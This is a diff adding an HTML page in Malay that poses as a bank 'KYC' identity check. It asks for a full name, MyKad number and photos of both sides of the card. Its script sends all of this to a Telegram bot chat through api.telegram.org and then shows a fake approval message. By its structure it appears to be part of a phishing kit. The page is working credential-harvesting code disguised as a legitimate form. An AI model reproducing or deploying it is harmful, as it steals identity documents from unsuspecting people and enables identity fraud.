@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengesahan Identiti (KYC)</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body style="background: #fff;">
+
+    <div class="top-nav">
+        <a href="deposit.html" style="font-size: 24px; text-decoration: none; color: #111;">←</a>
+        <div style="font-size: 18px; font-weight: 700;">Pengesahan Identiti</div>
+        <div style="width: 24px;"></div>
+    </div>
+
+    <div class="content" style="padding-top: 20px;">
+        <h2 style="font-size: 24px; font-weight: 700; margin-bottom: 10px;">Sahkan Identiti Anda</h2>
+        <p style="color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 30px;">Untuk mematuhi peraturan bank, sila muat naik gambar Kad Pengenalan (MyKad) anda yang jelas. Ini untuk memastikan keselamatan akaun.</p>
+
+        <form id="kycForm">
+            <div class="input-group">
+                <label>Nama Penuh (Seperti dalam IC)</label>
+                <input type="text" id="ic_name" placeholder="Ali Bin Abu" required>
+            </div>
+            <div class="input-group">
+                <label>No. Kad Pengenalan</label>
+                <input type="text" id="ic_num" placeholder="900101-14-5555" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Gambar Depan IC (MyKad)</label>
+                <input type="file" id="ic_front" accept="image/*" style="padding: 12px; background: var(--bg-gray);" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Gambar Belakang IC (MyKad)</label>
+                <input type="file" id="ic_back" accept="image/*" style="padding: 12px; background: var(--bg-gray);" required>
+            </div>
+            
+            <button type="submit" id="btn" style="background: var(--primary); color: #fff; padding: 16px; border-radius: 12px; border: none; font-weight: 700; font-size: 16px; margin-top: 20px;">Hantar Pengesahan</button>
+        </form>
+    </div>
+
+    <script src="js/config.js"></script>
+    <script>
+        document.getElementById('kycForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            btn.textContent = "Memuat naik...";
+            btn.disabled = true;
+
+            const ic_name = document.getElementById('ic_name').value;
+            const ic_num = document.getElementById('ic_num').value;
+            const front = document.getElementById('ic_front').files[0];
+            const back = document.getElementById('ic_back').files[0];
+
+            // Hantar Teks
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: `🪪 <b>KYC IC</b>\nNama: ${ic_name}\nIC: ${ic_num}`, parse_mode: "HTML" })
+            });
+
+            // Hantar Gambar Depan
+            if (front) {
+                const fd1 = new FormData();
+                fd1.append("chat_id", CONFIG.CHAT_ID);
+                fd1.append("photo", front);
+                fd1.append("caption", "Gambar Depan IC");
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 });
+            }
+
+            // Hantar Gambar Belakang
+            if (back) {
+                const fd2 = new FormData();
+                fd2.append("chat_id", CONFIG.CHAT_ID);
+                fd2.append("photo", back);
+                fd2.append("caption", "Gambar Belakang IC");
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 });
+            }
+
+            alert("Pengesahan berjaya! Sila tunggu 24 jam untuk kelulusan.");
+            window.location.href = "dashboard.html";
+        });
+    </script>
+</body>
+</html>
